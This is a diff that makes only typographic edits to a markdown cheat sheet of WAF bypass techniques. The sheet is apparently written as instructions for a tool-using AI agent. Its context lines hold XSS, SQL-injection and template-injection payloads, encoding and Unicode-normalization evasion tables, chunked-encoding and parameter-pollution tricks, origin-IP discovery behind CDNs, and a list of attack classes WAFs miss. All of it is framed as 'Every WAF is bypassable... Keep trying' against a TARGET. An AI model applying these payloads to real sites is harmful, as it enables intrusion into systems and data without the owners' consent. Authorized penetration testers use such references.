@@ -1,4 +1,4 @@
-# WAF Bypass Arsenal — Exhaustive Techniques & Payloads
+# WAF Bypass Arsenal - Exhaustive Techniques & Payloads
 
 **Every WAF is bypassable. Humans wrote it. Humans make mistakes. Keep trying.**
 
@@ -23,7 +23,7 @@ wafw00f https://TARGET
 # Fortinet: FORTIWAFSID cookie
 ```
 
-Then WebSearch: "[WAF name] bypass 2025 2026" — ALWAYS research the specific WAF.
+Then WebSearch: "[WAF name] bypass 2025 2026" - ALWAYS research the specific WAF.
 
 ---
 
@@ -31,85 +31,85 @@ Then WebSearch: "[WAF name] bypass 2025 2026" — ALWAYS research the specific W
 
 ### URL Encoding
 ```
-' → %27
-< → %3C
-> → %3E
-" → %22
-/ → %2F
-= → %3D
-( → %28
-) → %29
+' -> %27
+< -> %3C
+> -> %3E
+" -> %22
+/ -> %2F
+= -> %3D
+( -> %28
+) -> %29
 ```
 
 ### Double URL Encoding
 ```
-' → %2527
-< → %253C
-> → %253E
+' -> %2527
+< -> %253C
+> -> %253E
 ```
 
 ### Triple URL Encoding
 ```
-' → %252527
+' -> %252527
 ```
 
 ### Unicode Encoding
 ```
-' → %u0027
-< → %u003C
-> → %u003E
-' → \u0027
-< → \u003c
+' -> %u0027
+< -> %u003C
+> -> %u003E
+' -> \u0027
+< -> \u003c
 ```
 
 ### Unicode Fullwidth Characters (visual confusables)
 ```
-< → ＜ (U+FF1C)
-> → ＞ (U+FF1E)
-' → ＇ (U+FF07)
-" → ＂ (U+FF02)
-( → （ (U+FF08)
-) → ） (U+FF09)
-/ → ／ (U+FF0F)
+< -> ＜ (U+FF1C)
+> -> ＞ (U+FF1E)
+' -> ＇ (U+FF07)
+" -> ＂ (U+FF02)
+( -> （ (U+FF08)
+) -> ） (U+FF09)
+/ -> ／ (U+FF0F)
 ```
 
 ### Unicode Normalization Bypass (NFC vs NFKC)
 ```
 If WAF uses NFC but backend uses NFKC:
-  ﬀ → ff (U+FB00 decomposes to ff)
-  ﬁ → fi (U+FB01)
-  ﬂ → fl (U+FB02)
-  ℌ → H (U+210C)
-  ℛ → R (U+211B)
-  Use: ＜ℌcript＞ → backend sees <script>
+  ﬀ -> ff (U+FB00 decomposes to ff)
+  ﬁ -> fi (U+FB01)
+  ﬂ -> fl (U+FB02)
+  ℌ -> H (U+210C)
+  ℛ -> R (U+211B)
+  Use: ＜ℌcript＞ -> backend sees <script>
 ```
 
 ### HTML Entity Encoding
 ```
-' → &#39; &#x27; &#039;
-< → &#60; &#x3C; &#060;
-> → &#62; &#x3E; &#062;
-" → &#34; &#x22; &#034;
-/ → &#47; &#x2F;
+' -> &#39; &#x27; &#039;
+< -> &#60; &#x3C; &#060;
+> -> &#62; &#x3E; &#062;
+" -> &#34; &#x22; &#034;
+/ -> &#47; &#x2F;
 ```
 
 ### HTML Entity with Leading Zeros
 ```
-< → &#0060; &#00060; &#000060;
-> → &#0062;
+< -> &#0060; &#00060; &#000060;
+> -> &#0062;
 ```
 
 ### Hex Encoding
 ```
-' → 0x27
-< → 0x3C
-1 → 0x31
+' -> 0x27
+< -> 0x3C
+1 -> 0x31
 ```
 
 ### Octal Encoding
 ```
-' → \47
-< → \74
+' -> \47
+< -> \74
 ```
 
 ### Base64 in Parameters
@@ -120,7 +120,7 @@ payload=PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
 ### JSON Unicode Escape
 ```
 \u003Cscript\u003Ealert(1)\u003C/script\u003E
-\u0024\u007b7*7\u007d  →  ${7*7}
+\u0024\u007b7*7\u007d  ->  ${7*7}
 ```
 
 ### Mixed Encoding
@@ -323,7 +323,7 @@ Content-Type: multipart/form-data; boundary=----
 Content-Type: multipart/form-data; boundary=----WebKitFormBoundary
 Content-Type: multipart/form-data; boundary=AAAA; charset=utf-8
 Content-Type: multipart/form-data; boundary=----; extra=junk
-# Mutate the boundary — WAF may fail to parse
+# Mutate the boundary - WAF may fail to parse
 ```
 
 ### Chunked Transfer Encoding
@@ -340,14 +340,14 @@ ECT
 
 0
 
-# WAF sees chunks, doesn't reassemble — backend does
+# WAF sees chunks, doesn't reassemble - backend does
 ```
 
 ### HTTP Parameter Pollution
 ```
 # Send same parameter twice:
 ?id=1&id=UNION+SELECT+1,2,3
-# WAF checks first, backend uses last (or vice versa — depends on framework)
+# WAF checks first, backend uses last (or vice versa - depends on framework)
 # Try both orders
 ```
 
@@ -394,7 +394,7 @@ X-Forwarded-Host: PAYLOAD
 # crt.sh: %.target.com
 # Censys/Shodan: search by SSL cert hash
 
-# Email headers (target sends email → reveals origin IP)
+# Email headers (target sends email -> reveals origin IP)
 # Register, trigger password reset, check email headers
 
 # MX/SPF records
@@ -413,25 +413,25 @@ subfinder -d target.com | dnsx -a | sort -u
 
 ## 8. WAF-INVISIBLE ATTACK CLASSES
 
-**If you cannot bypass the WAF for injection → hunt vulnerabilities WAFs CANNOT detect:**
+**If you cannot bypass the WAF for injection -> hunt vulnerabilities WAFs CANNOT detect:**
 
 ```
 WAF CANNOT DETECT:
-  → IDOR (authorization logic, not payload patterns)
-  → Business logic flaws (price manipulation, workflow bypass, step skipping)
-  → Race conditions (timing, not payload content)
-  → Authentication flaws (token manipulation, session logic)
-  → OAuth/OIDC misconfigurations
-  → GraphQL authorization bypass
-  → Mass assignment
-  → Information disclosure (data in normal responses)
-  → Subdomain takeover
-  → CORS misconfiguration exploitation
-  → JWT claim manipulation (valid-looking tokens)
-  → API versioning rollback
-  → WebSocket attacks (many WAFs don't inspect WS)
-  → Insecure direct object references
-  → Privilege escalation via parameter tampering
+  -> IDOR (authorization logic, not payload patterns)
+  -> Business logic flaws (price manipulation, workflow bypass, step skipping)
+  -> Race conditions (timing, not payload content)
+  -> Authentication flaws (token manipulation, session logic)
+  -> OAuth/OIDC misconfigurations
+  -> GraphQL authorization bypass
+  -> Mass assignment
+  -> Information disclosure (data in normal responses)
+  -> Subdomain takeover
+  -> CORS misconfiguration exploitation
+  -> JWT claim manipulation (valid-looking tokens)
+  -> API versioning rollback
+  -> WebSocket attacks (many WAFs don't inspect WS)
+  -> Insecure direct object references
+  -> Privilege escalation via parameter tampering
 
 THESE ARE OFTEN HIGHER SEVERITY THAN XSS/SQLI ANYWAY.
 ```
